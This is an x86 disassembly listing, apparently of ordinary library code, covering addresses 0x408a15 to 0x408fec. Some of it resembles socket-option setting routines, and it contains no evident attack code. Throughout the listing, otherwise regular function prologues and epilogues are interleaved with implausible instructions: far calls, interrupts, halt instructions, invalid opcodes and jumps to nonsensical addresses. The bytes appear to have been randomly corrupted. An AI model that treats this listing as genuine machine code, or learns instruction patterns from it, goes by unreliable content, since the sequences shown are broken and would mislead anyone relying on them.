  408a15:	d5 7f                	aad    $0x7f
  408a17:	75 eb                	jne    0x408a04
  408a19:	40                   	inc    %eax
  408a1a:	44                   	inc    %esp
  408a1b:	95                   	xchg   %eax,%ebp
  408a1c:	04 c5                	add    $0xc5,%al
  408a1e:	9a c9 40 00 53 50 56 	lcall  $0x5650,$0x530040c9
  408a25:	e8 26 1b 00 00       	call   0x40a550
  408a2a:	f7 fe                	idiv   %esi
  408a2c:	83 c9 ff             	or     $0xffffffff,%ecx
  408a2f:	33 c0                	xor    %eax,%eax
  408a31:	cb                   	lret
  408a32:	ae                   	scas   %es:(%edi),%al
  408a33:	f7 d1                	not    %ecx
  408a35:	49                   	dec    %ecx
  408a36:	28 c1                	sub    %al,%cl
  408a38:	0d 22 85 c0 74       	or     $0x74c08522,%eax
  408a3d:	c0 8a 4c 49 ff 48 77 	rorb   $0x77,0x48ff494c(%edx)
  408a44:	f9                   	stc
  408a45:	0d 74 01 80 79       	or     $0x79800174,%eax
  408a4a:	0a 75 04             	or     0x4(%ebp),%dh
  408a4d:	c6 04 30 18          	movb   $0x18,(%eax,%esi,1)
  408a51:	85 c0                	test   %eax,%eax
  408a53:	75 e9                	jne    0x408a3e
  408a55:	8b c6                	mov    %esi,%eax
  408a57:	93                   	xchg   %eax,%ebx
  408a58:	5e                   	pop    %esi
  408a59:	5b                   	pop    %ebx
  408a5a:	5d                   	pop    %ebp
  408a5b:	c3                   	ret
  408a5c:	8b 7d 10             	mov    0x10(%ebp),%edi
  408a5f:	57                   	push   %edi
  408a60:	1a 35 00 41 00 29    	sbb    0x29004100,%dh
  408a66:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  408a67:	e8 14 fc 94 ff       	call   0xffd58680
  408a6c:	83 c4 d5             	add    $0xffffffd5,%esp
  408a6f:	8b c6                	mov    %esi,%eax
  408a71:	47                   	inc    %edi
  408a72:	5e                   	pop    %esi
  408a73:	5b                   	pop    %ebx
  408a74:	5d                   	pop    %ebp
  408a75:	c3                   	ret
  408a76:	90                   	nop
  408a77:	29 02                	sub    %eax,(%edx)
  408a79:	5a                   	pop    %edx
  408a7a:	90                   	nop
  408a7b:	90                   	nop
  408a7c:	90                   	nop
  408a7d:	90                   	nop
  408a7e:	90                   	nop
  408a7f:	af                   	scas   %es:(%edi),%eax
  408a80:	a8 8b                	test   $0x8b,%al
  408a82:	ec                   	in     (%dx),%al
  408a83:	bf 45 08 50 ff       	mov    $0xff500845,%edi
  408a88:	15 55 c1 40 00       	adc    $0x40c155,%eax
  408a8d:	83 48 04 85          	orl    $0xffffff85,0x4(%eax)
  408a91:	c0 74 d8 8b 4d       	shlb   $0x4d,-0x75(%eax,%ebx,8)
  408a96:	10 80 55 0c 50 51    	adc    %al,0x51500c55(%eax)
  408a9c:	4c                   	dec    %esp
  408a9d:	e8 de 5b ff ff       	call   0x3fe680
  408aa2:	83 c4 0c             	add    $0xc,%esp
  408aa5:	5d                   	pop    %ebp
  408aa6:	c3                   	ret
  408aa7:	8b 45 10             	mov    0x10(%ebp),%eax
  408aaa:	8b 9c 0c 68 54 f9 40 	mov    0x40f95468(%esp,%ecx,1),%ebx
  408ab1:	5a                   	pop    %edx
  408ab2:	7c 51                	jl     0x408b05
  408ab4:	9d                   	popf
  408ab5:	c7                   	(bad)
  408ab6:	11 ff                	adc    %edi,%edi
  408ab8:	ff 83 c4 0c 13 c3    	incl   -0x3cecf33c(%ebx)
  408abe:	90                   	nop
  408abf:	90                   	nop
  408ac0:	61                   	popa
  408ac1:	8b ec                	mov    %esp,%ebp
  408ac3:	19 36                	sbb    %esi,(%esi)
  408ac5:	0c 8b                	or     $0x8b,%al
  408ac7:	4d                   	dec    %ebp
  408ac8:	0c 9c                	or     $0x9c,%al
  408aca:	8b 75 10             	mov    0x10(%ebp),%esi
  408acd:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408ad0:	8b b1 08 6a 00 fa    	mov    -0x5ff95f8(%ecx),%esi
  408ad6:	06                   	push   %es
  408ad7:	6a 00                	push   $0x0
  408ad9:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408adc:	0f 45 f4             	cmovne %esp,%esi
  408adf:	6a c8                	push   $0xffffffc8
  408ae1:	52                   	push   %edx
  408ae2:	07                   	pop    %es
  408ae3:	51                   	push   %ecx
  408ae4:	04 8d                	add    $0x8d,%al
  408ae6:	45                   	inc    %ebp
  408ae7:	f4                   	hlt
  408ae8:	be 01 a3 c5 c7       	mov    $0xc7c5a301,%esi
  408aed:	45                   	inc    %ebp
  408aee:	1a 00                	sbb    (%eax),%al
  408af0:	15 5b 00 ff 15       	adc    $0x15ff005b,%eax
  408af5:	98                   	cwtl
  408af6:	c1 40 36 83          	roll   $0x83,0x36(%eax)
  408afa:	f8                   	clc
  408afb:	ff 75 2c             	push   0x2c(%ebp)
  408afe:	30 8b 3d d8 9c 40    	xor    %cl,0x409cd83d(%ebx)
  408b04:	c0 ff d7             	sar    $0xd7,%bh
  408b07:	85 6b 75             	test   %ebp,0x75(%ebx)
  408b0a:	0a 89 06 5f 5e 8b    	or     -0x74a1a0fa(%ecx),%cl
  408b10:	cd aa                	int    $0xaa
  408b12:	7b 0c                	jnp    0x408b20
  408b14:	00 ff                	add    %bh,%bh
  408b16:	d7                   	xlat   %ds:(%ebx)
  408b17:	10 06                	adc    %al,(%esi)
  408b19:	00 00                	add    %al,(%eax)
  408b1b:	00 00                	add    %al,(%eax)
  408b1d:	5f                   	pop    %edi
  408b1e:	05 80 fc 0a 00       	add    $0xafc80,%eax
  408b23:	5e                   	pop    %esi
  408b24:	8b e5                	mov    %ebp,%esp
  408b26:	5d                   	pop    %ebp
  408b27:	c2 0c 00             	ret    $0xc
  408b2a:	2c 45                	sub    $0x45,%al
  408b2c:	93                   	xchg   %eax,%ebx
  408b2d:	89 06                	mov    %eax,(%esi)
  408b2f:	33 25 5e e3 e5 5d    	xor    0x5de5e35e,%esp
  408b35:	c2 0c 00             	ret    $0xc
  408b38:	90                   	nop
  408b39:	99                   	cltd
  408b3a:	90                   	nop
  408b3b:	90                   	nop
  408b3c:	90                   	nop
  408b3d:	f4                   	hlt
  408b3e:	90                   	nop
  408b3f:	90                   	nop
  408b40:	55                   	push   %ebp
  408b41:	8b ec                	mov    %esp,%ebp
  408b43:	83 ec 10             	sub    $0x10,%esp
  408b46:	f9                   	stc
  408b47:	4d                   	dec    %ebp
  408b48:	ff 56 8b             	call   *-0x75(%esi)
  408b4b:	f4                   	hlt
  408b4c:	10 6a 00             	adc    %ch,0x0(%edx)
  408b4f:	c0 b7 7f 6a 00 8b 06 	shlb   $0x6,-0x74ff9581(%edi)
  408b56:	52                   	push   %edx
  408b57:	8b 55 08             	mov    0x8(%ebp),%edx
  408b5a:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408b5d:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408b60:	89 4d d6             	mov    %ecx,-0x2a(%ebp)
  408b63:	50                   	push   %eax
  408b64:	8b 42 04             	mov    0x4(%edx),%eax
  408b67:	d2 4d f0             	rorb   %cl,-0x10(%ebp)
  408b6a:	6a 01                	push   $0x1
  408b6c:	51                   	push   %ecx
  408b6d:	d3 c7                	rol    %cl,%edi
  408b6f:	a0 fc 00 00 00       	mov    0xfc,%al
  408b74:	00 c7                	add    %al,%bh
  408b76:	45                   	inc    %ebp
  408b77:	13 00                	adc    (%eax),%eax
  408b79:	00 00                	add    %al,(%eax)
  408b7b:	00 ff                	add    %bh,%bh
  408b7d:	88 94 c1 40 00 83 f8 	mov    %dl,-0x77cffc0(%ecx,%eax,8)
  408b84:	ff 75 2c             	push   0x2c(%ebp)
  408b87:	57                   	push   %edi
  408b88:	07                   	pop    %es
  408b89:	3d ee c1 40 00       	cmp    $0x40c1ee,%eax
  408b8e:	ff d7                	call   *%edi
  408b90:	85 c0                	test   %eax,%eax
  408b92:	75 0a                	jne    0x408b9e
  408b94:	89 06                	mov    %eax,(%esi)
  408b96:	5f                   	pop    %edi
  408b97:	5e                   	pop    %esi
  408b98:	f1                   	int1
  408b99:	e5 5d                	in     $0x5d,%eax
  408b9b:	40                   	inc    %eax
  408b9c:	0c 00                	or     $0x0,%al
  408b9e:	72 d7                	jb     0x408b77
  408ba0:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  408ba6:	5f                   	pop    %edi
  408ba7:	05 80 fc 0a 00       	add    $0xafc80,%eax
  408bac:	5e                   	pop    %esi
  408bad:	8b e5                	mov    %ebp,%esp
  408baf:	5d                   	pop    %ebp
  408bb0:	c2 d1 00             	ret    $0xd1
  408bb3:	8b 45 6b             	mov    0x6b(%ebp),%eax
  408bb6:	89 06                	mov    %eax,(%esi)
  408bb8:	5e                   	pop    %esi
  408bb9:	f7 d8                	neg    %eax
  408bbb:	1b c0                	sbb    %eax,%eax
  408bbd:	17                   	pop    %ss
  408bbe:	82 ee fe             	sub    $0xfe,%dh
  408bc1:	ff 4e ed             	decl   -0x13(%esi)
  408bc4:	11 01                	adc    %eax,(%ecx)
  408bc6:	10 8b e5 5d c2 0e    	adc    %cl,0xec25de5(%ebx)
  408bcc:	00 90 90 90 55 8b    	add    %dl,-0x74aa6f70(%eax)
  408bd2:	ec                   	in     (%dx),%al
  408bd3:	51                   	push   %ecx
  408bd4:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408bd7:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408bda:	50                   	push   %eax
  408bdb:	68 7e c9 04 80       	push   $0x8004c97e
  408be0:	51                   	push   %ecx
  408be1:	e1 45                	loope  0x408c28
  408be3:	c0 00 00             	rolb   $0x0,(%eax)
  408be6:	00 00                	add    %al,(%eax)
  408be8:	ff 11                	call   *(%ecx)
  408bea:	b4 c1                	mov    $0xc1,%ah
  408bec:	40                   	inc    %eax
  408bed:	00 78 f8             	add    %bh,-0x8(%eax)
  408bf0:	ff                   	(bad)
  408bf1:	f9                   	stc
  408bf2:	1e                   	push   %ds
  408bf3:	ad                   	lods   %ds:(%esi),%eax
  408bf4:	37                   	aaa
  408bf5:	35 d8 c1 40 00       	xor    $0x40c1d8,%eax
  408bfa:	ff d6                	call   *%esi
  408bfc:	85 c0                	test   %eax,%eax
  408bfe:	75 05                	jne    0x408c05
  408c00:	5e                   	pop    %esi
  408c01:	e9 18 5d c3 ff       	jmp    0x3e91e
  408c06:	d6                   	salc
  408c07:	05 80 fc d1 00       	add    $0xd1fc80,%eax
  408c0c:	0d 8b e5 a7 c1       	or     $0xc1a7e58b,%eax
  408c11:	33 c0                	xor    %eax,%eax
  408c13:	8b e5                	mov    %ebp,%esp
  408c15:	5d                   	pop    %ebp
  408c16:	c3                   	ret
  408c17:	90                   	nop
  408c18:	90                   	nop
  408c19:	90                   	nop
  408c1a:	90                   	nop
  408c1b:	90                   	nop
  408c1c:	90                   	nop
  408c1d:	90                   	nop
  408c1e:	90                   	nop
  408c1f:	f6 28                	imulb  (%eax)
  408c21:	8b c6                	mov    %esi,%eax
  408c23:	51                   	push   %ecx
  408c24:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408c27:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408c2a:	50                   	push   %eax
  408c2b:	68 7e 66 c8 80       	push   $0x80c8667e
  408c30:	51                   	push   %ecx
  408c31:	c7                   	(bad)
  408c32:	33 fc                	xor    %esp,%edi
  408c34:	14 a4                	adc    $0xa4,%al
  408c36:	00 00                	add    %al,(%eax)
  408c38:	1a 3b                	sbb    (%ebx),%bh
  408c3a:	b4 c1                	mov    $0xc1,%ah
  408c3c:	40                   	inc    %eax
  408c3d:	00 cb                	add    %cl,%bl
  408c3f:	f8                   	clc
  408c40:	ff 75 1e             	push   0x1e(%ebp)
  408c43:	56                   	push   %esi
  408c44:	8b 35 d8 c1 40 00    	mov    0x40c1d8,%esi
  408c4a:	ff d6                	call   *%esi
  408c4c:	85 c0                	test   %eax,%eax
  408c4e:	28 05 5e 55 1f 5d    	sub    %al,0x5d1f555e
  408c54:	f3 2d d6 05 80 fc    	repz sub $0xfc8005d6,%eax
  408c5a:	0a 00                	or     (%eax),%al
  408c5c:	5e                   	pop    %esi
  408c5d:	8b 5b 5d             	mov    0x5d(%ebx),%ebx
  408c60:	c3                   	ret
  408c61:	33 c0                	xor    %eax,%eax
  408c63:	8b 27                	mov    (%edi),%esp
  408c65:	5d                   	pop    %ebp
  408c66:	7e 90                	jle    0x408bf8
  408c68:	90                   	nop
  408c69:	e0 90                	loopne 0x408bfb
  408c6b:	88 90 90 90 90 55    	mov    %dl,0x55909090(%eax)
  408c71:	8b ec                	mov    %esp,%ebp
  408c73:	53                   	push   %ebx
  408c74:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  408c77:	56                   	push   %esi
  408c78:	8b 75 08             	mov    0x8(%ebp),%esi
  408c7b:	57                   	push   %edi
  408c7c:	8b 7d 10             	mov    0x10(%ebp),%edi
  408c7f:	8b c3                	mov    %ebx,%eax
  408c81:	0b 19                	or     (%ecx),%ebx
  408c83:	d9 29                	fldcw  (%ecx)
  408c85:	5f                   	pop    %edi
  408c86:	4e                   	dec    %esi
  408c87:	62                   	(bad)
  408c88:	d8 46 b4             	fadds  -0x4c(%esi)
  408c8b:	29 c8                	sub    %ecx,%eax
  408c8d:	0f 84 0d 86 83 00    	je     0xc412a0
  408c93:	8b 56 04             	mov    0x4(%esi),%edx
  408c96:	52                   	push   %edx
  408c97:	e8 84 ff ff ff       	call   0x408c20
  408c9c:	83 c4 b8             	add    $0xffffffb8,%esp
  408c9f:	85 c0                	test   %eax,%eax
  408ca1:	0f 84 f6 00 00 00    	je     0x408d9d
  408ca7:	f0 5e                	lock pop %esi
  408ca9:	5b                   	pop    %ebx
  408caa:	5d                   	pop    %ebp
  408cab:	8a 2e                	mov    (%esi),%ch
  408cad:	00 85 ff 0f 4d 9b    	add    %al,-0x64b2f001(%ebp)
  408cb3:	00 00                	add    %al,(%eax)
  408cb5:	00 7f 08             	add    %bh,0x8(%edi)
  408cb8:	85 db                	test   %ebx,%ebx
  408cba:	0f 86 87 00 00 8b    	jbe    0x8b408d47
  408cc0:	8b 46 20             	mov    0x20(%esi),%eax
  408cc3:	75 4e                	jne    0x408d13
  408cc5:	24 0b                	and    $0xb,%al
  408cc7:	ba c2 14 8b 4e       	mov    $0x4e8b14c2,%edx
  408ccc:	04 51                	add    $0x51,%al
  408cce:	f0 fd                	lock std
  408cd0:	fe                   	(bad)
  408cd1:	ff c1                	inc    %ecx
  408cd3:	95                   	xchg   %eax,%ebp
  408cd4:	c4 04 85 c0 29 85 c7 	les    -0x387ad640(,%eax,4),%eax
  408cdb:	00 06                	add    %al,(%esi)
  408cdd:	00 8b 56 fb 3b d3    	add    %cl,-0x2cc404aa(%ebx)
  408ce3:	75 0b                	jne    0x408cf0
  408ce5:	8b e7                	mov    %edi,%esp
  408ce7:	24 2c                	and    $0x2c,%al
  408ce9:	c7                   	(bad)
  408cea:	0f 84 ad 00 00 00    	je     0x408d9d
  408cf0:	87 5c 10 13          	xchg   %ebx,0x13(%eax,%edx,1)
  408cf4:	00 68 56             	add    %ch,0x56(%eax)
  408cf7:	c0 c2 00             	rol    $0x0,%dl
  408cfa:	51                   	push   %ecx
  408cfb:	53                   	push   %ebx
  408cfc:	8d                   	lea    (bad),%ebx
  408cfd:	dd 18                	fstpl  (%eax)
  408cff:	3b 8c 28 00 78 8b de 	cmp    -0x21748800(%eax,%ebp,1),%ecx
  408d06:	04 68                	add    $0x68,%al
  408d08:	b2 b8                	mov    $0xb8,%dl
  408d0a:	e3 40                	jecxz  0x408d4c
  408d0c:	00 6a 04             	add    %ch,0x4(%edx)
  408d0f:	57                   	push   %edi
  408d10:	c2 64 6c             	ret    $0x6c64
  408d13:	00 00                	add    %al,(%eax)
  408d15:	68 ff 7b 00 00       	push   $0x7bff
  408d1a:	52                   	push   %edx
  408d1b:	11 07                	adc    %eax,(%edi)
  408d1d:	ff d3                	call   *%ebx
  408d1f:	4b                   	dec    %ebx
  408d20:	64 81 6a 04 57 68 05 	subl   $0x10056857,%fs:0x4(%edx)
  408d27:	10 
  408d28:	00 00                	add    %al,(%eax)
  408d2a:	68 ff ff 00 00       	push   $0xffff
  408d2f:	7f 1c                	jg     0x408d4d
  408d31:	d3 8b 03 10 04 5d    	rorl   %cl,0x5d041003(%ebx)
  408d37:	0c 89                	or     $0x89,%al
  408d39:	7e 24                	jle    0x408d5f
  408d3b:	89 80 20 5f 5e 33    	mov    %eax,0x335e5f20(%eax)
  408d41:	c0 5b 5d c2          	rcrb   $0xc2,0x5d(%ebx)
  408d45:	0c e6                	or     $0xe6,%al
  408d47:	85 ff                	test   %edi,%edi
  408d49:	7f 52                	jg     0x408d9d
  408d4b:	7c 04                	jl     0x408d51
  408d4d:	85 db                	test   %ebx,%ebx
  408d4f:	73 4c                	jae    0x408d9d
  408d51:	8b 4e 04             	mov    0x4(%esi),%ecx
  408d54:	bd 45 08 00 00       	mov    $0x845,%ebp
  408d59:	00 00                	add    %al,(%eax)
  408d5b:	51                   	push   %ecx
  408d5c:	e8 6f fe e8 ff       	call   0x298bd0
  408d61:	83 c4 04             	add    $0x4,%esp
  408d64:	85 c0                	test   %eax,%eax
  408d66:	75 3d                	jne    0x408da5
  408d68:	8b 46 04             	mov    0x4(%esi),%eax
  408d6b:	b7 3d                	mov    $0x3d,%bh
  408d6d:	b8 c1 40 00 8d       	mov    $0x8d0040c1,%eax
  408d72:	55                   	push   %ebp
  408d73:	08 6a 04             	or     %ch,0x4(%edx)
  408d76:	52                   	push   %edx
  408d77:	68 06 11 00 70       	push   $0x70001106
  408d7c:	68 b2 ab 00 00       	push   $0xabb2
  408d81:	50                   	push   %eax
  408d82:	ff d7                	call   *%edi
  408d84:	8b 56 99             	mov    -0x67(%esi),%edx
  408d87:	8d 4d 08             	lea    0x8(%ebp),%ecx
  408d8a:	6a 04                	push   $0x4
  408d8c:	51                   	push   %ecx
  408d8d:	68 05 98 00 00       	push   $0x9805
  408d92:	68 ff ff 00 5e       	push   $0x5e00ffff
  408d97:	52                   	push   %edx
  408d98:	ff d7                	call   *%edi
  408d9a:	8b 7d 10             	mov    0x10(%ebp),%edi
  408d9d:	89 5e 20             	mov    %ebx,0x20(%esi)
  408da0:	89 7e 24             	mov    %edi,0x24(%esi)
  408da3:	33 55 5f             	xor    0x5f(%ebp),%edx
  408da6:	5e                   	pop    %esi
  408da7:	5b                   	pop    %ebx
  408da8:	5d                   	pop    %ebp
  408da9:	c2 af a1             	ret    $0xa1af
  408dac:	3e 90                	ds nop
  408dae:	90                   	nop
  408daf:	90                   	nop
  408db0:	55                   	push   %ebp
  408db1:	30 77 51             	xor    %dh,0x51(%edi)
  408db4:	8b 45 71             	mov    0x71(%ebp),%eax
  408db7:	8b c9                	mov    %ecx,%ecx
  408db9:	85 10                	test   %edx,(%eax)
  408dbb:	0f 95 c1             	setne  %cl
  408dbe:	78 ef                	js     0x408daf
  408dc0:	fc                   	cld
  408dc1:	17                   	pop    %ss
  408dc2:	4d                   	dec    %ebp
  408dc3:	0c 83                	or     $0x83,%al
  408dc5:	f9                   	stc
  408dc6:	b8 56 0f 8f 7c       	mov    $0x7c8f0f56,%eax
  408dcb:	02 00                	add    (%eax),%al
  408dcd:	00 0f                	add    %cl,(%edi)
  408dcf:	84 3d 18 00 00 49    	test   %bh,0x49000018
  408dd5:	83 f9 ef             	cmp    $0xffffffef,%ecx
  408dd8:	0f 87 7e 03 00 00    	ja     0x40915c
  408dde:	ec                   	in     (%dx),%al
  408ddf:	aa                   	stos   %al,%es:(%edi)
  408de0:	8a 91 10 91 4c 00    	mov    0x4c9110(%ecx),%dl
  408de6:	53                   	push   %ebx
  408de7:	24 95                	and    $0x95,%al
  408de9:	f8                   	clc
  408dea:	90                   	nop
  408deb:	40                   	inc    %eax
  408dec:	d5 97                	aad    $0x97
  408dee:	75 08                	jne    0x408df8
  408df0:	33 d2                	xor    %edx,%edx
  408df2:	8b 4e 38             	mov    0x38(%esi),%ecx
  408df5:	83 e1 02             	and    $0x2,%ecx
  408df8:	80 f9 02             	cmp    $0x2,%cl
  408dfb:	39 71 c2             	cmp    %esi,-0x3e(%ecx)
  408dfe:	3b b4 74 27 8b 4e 04 	cmp    0x44e8b27(%esp,%esi,2),%esi
  408e05:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408e08:	6a 04                	push   $0x4
  408e0a:	50                   	push   %eax
  408e0b:	6a 08                	push   $0x8
  408e0d:	68 ff ff 00 00       	push   $0xffff
  408e12:	51                   	push   %ecx
  408e13:	ff 15 b8 47 40 00    	call   *0x4047b8
  408e19:	6c                   	insb   (%dx),%es:(%edi)
  408e1a:	f8                   	clc
  408e1b:	ea 7d 84 43 02 e9 00 	ljmp   $0xe9,$0x243847d
  408e22:	8b 45 10             	mov    0x10(%ebp),%eax
  408e25:	85 af 8b 86 38 74    	test   %ebp,0x7438868b(%edi)
  408e2b:	0e                   	push   %cs
  408e2c:	36 02 ce             	ss add %dh,%cl
  408e2f:	5d                   	pop    %ebp
  408e30:	38 33                	cmp    %dh,(%ebx)
  408e32:	c0 5e 8b e5          	rcrb   $0xe5,-0x75(%esi)
  408e36:	5d                   	pop    %ebp
  408e37:	cc                   	int3
  408e38:	0c 00                	or     $0x0,%al
  408e3a:	24 fd                	and    $0xfd,%al
  408e3c:	89 46 38             	mov    %eax,0x38(%esi)
  408e3f:	33 21                	xor    (%ecx),%esp
  408e41:	5e                   	pop    %esi
  408e42:	8b e5                	mov    %ebp,%esp
  408e44:	5d                   	pop    %ebp
  408e45:	c2 0c 00             	ret    $0xc
  408e48:	8b 75 e8             	mov    -0x18(%ebp),%esi
  408e4b:	33 a0 8b 56 f4 83    	xor    -0x7c0ba975(%eax),%esp
  408e51:	e2 04                	loop   0x408e57
  408e53:	34 fa                	xor    $0xfa,%al
  408e55:	04 0f                	add    $0xf,%al
  408e57:	94                   	xchg   %eax,%esp
  408e58:	c1 3b c1             	sarl   $0xc1,(%ebx)
  408e5b:	be d4 c8 1a 04       	mov    $0x41ac8d4,%esi
  408e60:	8d 55 fc             	lea    -0x4(%ebp),%edx
  408e63:	7d 04                	jge    0x408e69
  408e65:	52                   	push   %edx
  408e66:	6a 01                	push   $0x1
  408e68:	68 ff ff 00 00       	push   $0xffff
  408e6d:	50                   	push   %eax
  408e6e:	ff 15 39 c1 40 00    	call   *0x40c139
  408e74:	83 f8 fa             	cmp    $0xfffffffa,%eax
  408e77:	0f 84 e8 01 00 00    	je     0x409065
  408e7d:	8b 45 c1             	mov    -0x3f(%ebp),%eax
  408e80:	85 c0                	test   %eax,%eax
  408e82:	8b 46 f0             	mov    -0x10(%esi),%eax
  408e85:	74 0e                	je     0x408e95
  408e87:	78 04                	js     0x408e8d
  408e89:	89 46 38             	mov    %eax,0x38(%esi)
  408e8c:	33 c0                	xor    %eax,%eax
  408e8e:	5e                   	pop    %esi
  408e8f:	8b e5                	mov    %ebp,%esp
  408e91:	98                   	cwtl
  408e92:	c2 0c fe             	ret    $0xfe0c
  408e95:	5d                   	pop    %ebp
  408e96:	6b 89 46 38 33 c0 5e 	imul   $0x5e,-0x3fccc7ba(%ecx),%ecx
  408e9d:	86 e5                	xchg   %ah,%ch
  408e9f:	5d                   	pop    %ebp
  408ea0:	c2 0c 00             	ret    $0xc
  408ea3:	8b e0                	mov    %eax,%esp
  408ea5:	08 33                	or     %dh,(%ebx)
  408ea7:	2c 8b                	sub    $0x8b,%al
  408ea9:	4e                   	dec    %esi
  408eaa:	38 83 e1 10 80 f9    	cmp    %al,-0x67fef1f(%ebx)
  408eb0:	10 0f                	adc    %cl,(%edi)
  408eb2:	94                   	xchg   %eax,%esp
  408eb3:	c2 3b c2             	ret    $0xc23b
  408eb6:	0f 84 75 d2 ff 35    	je     0x36406131
  408ebc:	8b 4e 04             	mov    0x4(%esi),%ecx
  408ebf:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408ec2:	29 04 50             	sub    %eax,(%eax,%edx,2)
  408ec5:	6a bd                	push   $0xffffffbd
  408ec7:	68 2b 36 cf 00       	push   $0xcf362b
  408ecc:	51                   	push   %ecx
  408ecd:	ff 15 b8 c1 40 00    	call   *0x40c1b8
  408ed3:	1a 75 ff             	sbb    -0x1(%ebp),%dh
  408ed6:	0f 84 89 01 00 00    	je     0x409065
  408edc:	8b 45 10             	mov    0x10(%ebp),%eax
  408edf:	85 c0                	test   %eax,%eax
  408ee1:	8b b7 38 74 1d 0c    	mov    0xc1d7438(%edi),%esi
  408ee7:	10 89 46 3a 33 b5    	adc    %cl,-0x4accc5ba(%ecx)
  408eed:	5e                   	pop    %esi
  408eee:	01 e5                	add    %esp,%ebp
  408ef0:	5d                   	pop    %ebp
  408ef1:	c2 0c 00             	ret    $0xc
  408ef4:	24 ef                	and    $0xef,%al
  408ef6:	89 46 38             	mov    %eax,0x38(%esi)
  408ef9:	33 c0                	xor    %eax,%eax
  408efb:	5e                   	pop    %esi
  408efc:	8b e5                	mov    %ebp,%esp
  408efe:	5d                   	pop    %ebp
  408eff:	c2 0c 00             	ret    $0xc
  408f02:	8b 75 08             	mov    0x8(%ebp),%esi
  408f05:	33 c9                	xor    %ecx,%ecx
  408f07:	8b 56 38             	mov    0x38(%esi),%edx
  408f0a:	8c 4f 08             	mov    %cs,0x8(%edi)
  408f0d:	71 fa                	jno    0x408f09
  408f0f:	78 0f                	js     0x408f20
  408f11:	94                   	xchg   %eax,%esp
  408f12:	c1 3b c8             	sarl   $0xc8,(%ebx)
  408f15:	b1 84                	mov    $0x84,%cl
  408f17:	16                   	push   %ss
  408f18:	ff                   	(bad)
  408f19:	ff                   	(bad)
  408f1a:	ff 85 c0 64 17 8b    	incl   -0x74e89b40(%ebp)
  408f20:	56                   	push   %esi
  408f21:	04 52                	add    $0x52,%al
  408f23:	e8 52 fc ff ff       	call   0x408b7a
  408f28:	83 c4 04             	add    $0x4,%esp
  408f2b:	85 c0                	test   %eax,%eax
  408f2d:	74 1b                	je     0x408f4a
  408f2f:	5e                   	pop    %esi
  408f30:	8b e5                	mov    %ebp,%esp
  408f32:	5d                   	pop    %ebp
  408f33:	79 46                	jns    0x408f7b
  408f35:	00 51 46             	add    %dl,0x46(%ecx)
  408f38:	04 f4                	add    $0xf4,%al
  408f3a:	8f                   	(bad)
  408f3b:	91                   	xchg   %eax,%ecx
  408f3c:	fc                   	cld
  408f3d:	ff                   	(bad)
  408f3e:	ff 83 c4 04 85 22    	incl   0x228504c4(%ebx)
  408f44:	0f 85 a5 01 00 00    	jne    0x4090ef
  408f4a:	36 45                	ss inc %ebp
  408f4c:	08 85 c0 8b 46 45    	or     %al,0x45468bc0(%ebp)
  408f52:	74 0e                	je     0x408f62
  408f54:	0c 23                	or     $0x23,%al
  408f56:	89 46 38             	mov    %eax,0x38(%esi)
  408f59:	33 d8                	xor    %eax,%ebx
  408f5b:	5e                   	pop    %esi
  408f5c:	8b e5                	mov    %ebp,%esp
  408f5e:	5d                   	pop    %ebp
  408f5f:	c2 0c 00             	ret    $0xc
  408f62:	24 e9                	and    $0xe9,%al
  408f64:	89 46 38             	mov    %eax,0x38(%esi)
  408f67:	ed                   	in     (%dx),%eax
  408f68:	c0 48 8b e5          	rorb   $0xe5,-0x75(%eax)
  408f6c:	5d                   	pop    %ebp
  408f6d:	c2 0c 00             	ret    $0xc
  408f70:	65 75 08             	gs jne 0x408f7b
  408f73:	fa                   	cli
  408f74:	12 38                	adc    (%eax),%bh
  408f76:	83 e1 01             	and    $0x1,%ecx
  408f79:	fe c9                	dec    %cl
  408f7b:	f6 d9                	neg    %cl
  408f7d:	1b c9                	sbb    %ecx,%ecx
  408f7f:	41                   	inc    %ecx
  408f80:	3b c8                	cmp    %eax,%ecx
  408f82:	0f 84 a9 fe 5d ff    	je     0xff9e8e31
  408f88:	8d 55 33             	lea    0x33(%ebp),%edx
  408f8b:	6a 7d                	push   $0x7d
  408f8d:	66 89 45 08          	mov    %ax,0x8(%ebp)
  408f91:	97                   	xchg   %eax,%edi
  408f92:	46                   	inc    %esi
  408f93:	04 bf                	add    $0xbf,%al
  408f95:	81 80 00 00 dc 68 ff 	addl   $0x8600ffff,0x68dc0000(%eax)
  408f9c:	ff 00 86 
  408f9f:	50                   	push   %eax
  408fa0:	66 c7 45 bd 1e 00    	movw   $0x1e,-0x43(%ebp)
  408fa6:	53                   	push   %ebx
  408fa7:	15 b8 a9 40 00       	adc    $0x40a9b8,%eax
  408fac:	83 f8 49             	cmp    $0x49,%eax
  408faf:	0f 84 b0 00 00 00    	je     0x409065
  408fb5:	8b 45 a5             	mov    -0x5b(%ebp),%eax
  408fb8:	96                   	xchg   %eax,%esi
  408fb9:	c0 8b 46 38 74 0e 0c 	rorb   $0xc,0xe743846(%ebx)
  408fc0:	01 89 46 38 33 c0    	add    %ecx,-0x3fccc7ba(%ecx)
  408fc6:	5e                   	pop    %esi
  408fc7:	8b e5                	mov    %ebp,%esp
  408fc9:	5d                   	pop    %ebp
  408fca:	83 0c 00 24          	orl    $0x24,(%eax,%eax,1)
  408fce:	fe 89 7a 6b ec e8    	decb   -0x17139486(%ecx)
  408fd4:	5e                   	pop    %esi
  408fd5:	8b e5                	mov    %ebp,%esp
  408fd7:	5d                   	pop    %ebp
  408fd8:	c2 0c 00             	ret    $0xc
  408fdb:	8b 55 08             	mov    0x8(%ebp),%edx
  408fde:	8d 4d 10             	lea    0x10(%ebp),%ecx
  408fe1:	6a 04                	push   $0x4
  408fe3:	01 0c 42             	add    %ecx,(%edx,%eax,2)
  408fe6:	04 68                	add    $0x68,%al
  408fe8:	09 5f 00             	or     %ebx,0x0(%edi)
  408feb:	1f                   	pop    %ds
  408fec:	68 ff ff 00 00       	push   $0xffff
